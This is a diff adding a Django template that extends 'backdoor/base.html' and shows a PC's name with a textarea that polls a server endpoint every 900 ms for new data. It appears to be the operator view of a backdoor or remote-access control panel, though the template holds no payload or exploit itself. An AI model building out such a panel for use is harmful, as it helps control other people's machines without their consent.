@@ -1,0 +1,32 @@
+{% include 'backdoor/base.html' %}
+{% block content %}
+<h1>{{pc.pc_name}}</h1>
+<div class="mb-3">
+    <textarea class="form-control" id="exampleFormControlTextarea1" rows="10"></textarea>
+</div>
+<div class="mb-3">
+    <textarea class="form-control" id="exampleFormControlTextarea1" rows="10"></textarea>
+</div>
+<script>
+    $(document).ready(function(){
+        var $textarea = $('#exampleFormControlTextarea1');
+        $textarea.scrollTop($textarea[0].scrollHeight);
+    });
+</script>
+<script>$(document).ready(function(){
+    setInterval(function(){
+        $.ajax({
+            type:'GET',
+            url : "{% url 'ajax' pc.id %}",
+            success: function(response){
+                console.log(response.data);
+                document.getElementById("exampleFormControlTextarea1").value = response.data;      
+            },
+            error: function(response)
+            {
+                console.log("b");
+            }
+        });
+    },900);
+});</script>
+{% endblock content %}
